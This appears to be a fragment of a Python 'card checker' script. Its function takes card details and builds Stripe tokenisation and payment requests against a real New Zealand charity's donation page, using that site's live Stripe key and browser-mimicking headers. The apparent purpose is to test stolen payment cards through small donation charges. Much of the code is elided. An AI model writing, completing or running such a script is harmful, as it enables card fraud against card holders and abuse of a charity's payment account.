...
def Tele(ccx):
	...
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F6671a0211f%3B+stripe-js-v3%2F6671a0211f%3B+card-element&key=pk_live_51IMMhuF5f06t8fwDRHlCTBizXKGkgRHL8tTOiDmBQOYPGEWAmgUVesbc8rhfwgB12wAITGuLQjCAmfXxkOLnKS5c00hDDuNZO0'
	...
	headers = {
	    ...
	    'Origin': 'https://ourlittlevillage.org.nz',
	    'Referer': 'https://ourlittlevillage.org.nz/campaigns/one-off-donation/donate/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	...
	data = {
	    ...
	    '_wp_http_referer': '/campaigns/one-off-donation/donate/',
	    'campaign_id': '763',
	...
	data = {
	    ...
	    'use_stripe_sdk': 'true',
	    'key': 'pk_live_51IMMhuF5f06t8fwDRHlCTBizXKGkgRHL8tTOiDmBQOYPGEWAmgUVesbc8rhfwgB12wAITGuLQjCAmfXxkOLnKS5c00hDDuNZO0',
